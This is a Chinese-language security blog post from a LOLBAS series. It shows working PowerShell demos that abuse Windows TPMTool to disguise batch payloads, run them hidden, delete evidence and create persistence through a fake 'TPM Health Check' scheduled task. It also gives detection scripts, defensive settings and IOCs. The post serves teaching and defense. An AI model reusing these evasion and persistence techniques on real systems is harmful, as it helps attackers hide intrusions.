---
title: "LOLBAS鐵人賽Day17TPMTool - 濫用TPM管理工具進行檔案操作"
published: 2025-10-01T15:59:37.000Z
description: "LOLBAS 系列第 17 天"
tags: [LOLBAS, Windows, Security]
category: Research
draft: false
---

TPMTool.exe是Windows內建的可信平台模組管理工具

攻擊者可以利用他的**創建目錄結構**和**白名單信任**的特性，把它作為攻擊鏈的關鍵元件

今天我們就一起來看看這個工具的使用方法吧

## 工具特性

**關鍵功能**：`tpmtool gatherlogs [path]`會在指定路徑創建多個.txt和.xml檔案  
**濫用價值**：

1.  創建看起來合法的目錄結構
2.  生成可覆寫的檔案作為攻擊載體
3.  白名單程式不會觸發警報

## 來看看幾個攻擊 Demo

### Demo 1：利用TPMTool檔案覆寫執行攻擊

```powershell
$d = "$env:TEMP\TPMDiag"
mkdir $d -Force | Out-Null
tpmtool gatherlogs $d 2>$null

$tpmFiles = gci $d -Filter *.txt
if($tpmFiles){
    $target = $tpmFiles[0].FullName
    @'
@echo off
start calc.exe
start notepad.exe
echo TPM Module Loaded > %TEMP%\tpm_status.txt
'@ | Out-File $target -Force -Encoding ASCII
    
    Rename-Item $target "$d\TPMInit.bat" -Force
    Start-Process "$d\TPMInit.bat" -WindowStyle Hidden
    
    Start-Sleep 2
    if(Get-Process calc -EA 0){Write-Host "Payload executed via TPM file" -F Green}
}

Stop-Process -Name calc,notepad -Force -EA 0
Remove-Item $d -Recurse -Force -EA 0

```

**幾個比較重要的點**：

1.  tpmtool gatherlogs創建合法的TPM日誌檔案
2.  覆寫其中一個.txt檔案為批次腳本
3.  重新命名並執行，繞過某些檢測
4.  刪除證據

### Demo 2：TPMTool作為持久化觸發器

```powershell
$persistDir = "$env:LOCALAPPDATA\Microsoft\TPM"
mkdir $persistDir -Force | Out-Null

$triggerScript = @'
tpmtool gatherlogs C:\Windows\Temp\TPMCache
if exist C:\Windows\Temp\TPMCache\*.txt (
    powershell -NoP -W Hidden -C "Start-Process calc.exe"
    rmdir /s /q C:\Windows\Temp\TPMCache
)
'@

$triggerScript | Out-File "$persistDir\TPMSchedule.bat" -Encoding ASCII

schtasks /create /tn "TPM Health Check" /tr "$persistDir\TPMSchedule.bat" /sc hourly /f 2>$null

if($?){Write-Host "Persistence installed using TPMTool trigger" -F Green}

schtasks /run /tn "TPM Health Check" 2>$null
Start-Sleep 3

if(Get-Process calc -EA 0){
    Write-Host "TPMTool trigger successful" -F Green
    Stop-Process -Name calc -Force
}

schtasks /delete /tn "TPM Health Check" /f 2>$null
Remove-Item $persistDir -Recurse -Force -EA 0

```

**幾個比較重要的點**：

1.  tpmtool執行是觸發條件
2.  檢查tpmtool創建的檔案存在性
3.  偽裝成TPM健康檢查任務
4.  實際執行惡意payload

## TPMtool 的一些優勢

### 信任優勢

*   Microsoft簽章的二進制檔案
*   正常的系統維護工具
*   很少被EDR監控
*   可在使用者權限下執行

### 功能特性

*   **目錄創建**：自動創建包含多個檔案的目錄
*   **檔案生成**：產生.txt.xml 等可修改的檔案
*   **錯誤靜默**：執行失敗不會有明顯錯誤
*   **快速執行**：幾乎立即完成

### 偵測困難

*   合法工具的合法用途
*   產生的檔案名稱隨機
*   目錄結構看似正常
*   很難與真實TPM維護區分

## 偵測策略

### 關鍵行為模式

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4688} |
? {$_.Message -match 'tpmtool.*gatherlogs' -and $_.TimeCreated -gt (Get-Date).AddHours(-1)} |
% {
    $time = $_.TimeCreated
    $followUp = Get-WinEvent -FilterHashtable @{LogName='Security';ID=4688} |
    ? {$_.TimeCreated -gt $time -and $_.TimeCreated -lt $time.AddMinutes(5)}
    if($followUp | ? {$_.Message -match 'cmd|powershell|wscript'}){
        Write-Host "ALERT: TPMTool followed by script execution at $time" -F Red
    }
}

```

### 檔案系統監控

```powershell
$fsw = New-Object System.IO.FileSystemWatcher
$fsw.Path = $env:TEMP
$fsw.Filter = "TPM*"
$fsw.IncludeSubdirectories = $true
$fsw.EnableRaisingEvents = $true

Register-ObjectEvent -InputObject $fsw -EventName Created -Action {
    $path = $Event.SourceEventArgs.FullPath
    $files = gci $path -Recurse -Include *.bat,*.ps1,*.exe -EA 0
    if($files){
        Write-Host "SUSPICIOUS: Executable in TPM directory: $files" -F Red
    }
}

```

## 防禦建議

### 限制TPMTool使用

```powershell
# 只允許從特定路徑執行
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers\0\Paths" `
    -Name "{GUID}" -Value "C:\Windows\System32\tpmtool.exe" -PropertyType String

# 監控異常執行位置
Get-Process | ? {$_.Name -eq 'tpmtool' -and $_.Path -notlike "*System32*"}

```

### 行為基準線

正常的tpmtool使用：

*   由系統服務(svchost.exe)呼叫
*   輸出到Windows\\Logs\\TPM目錄
*   執行頻率極低（月或年）

異常的tpmtool使用：

*   由使用者或腳本直接執行
*   輸出到TEMP或使用者目錄
*   短時間內多次執行
*   後續有腳本或程式執行

## IOCs

**檔案特徵**：

*   `%TEMP%\TPM*\*.txt`被修改為非文字內容
*   TPM目錄中出現.bat.ps1.exe檔案
*   TPM日誌檔案大小異常（>1MB）

**進程鏈**：

*   `powershell.exe tpmtool.exe cmd.exe`
*   `tpmtool.exe [修改檔案] wscript.exe`

**時序特徵**：

*   tpmtool執行後立即有檔案執行
*   同一目錄在短時間內被tpmtool訪問多次

## 總結

TPMTool 之所以強大是因為：

1.  創建合法的目錄結構作掩護
2.  利用產生的檔案作為payload容器
3.  以TPM診斷名義執行惡意操作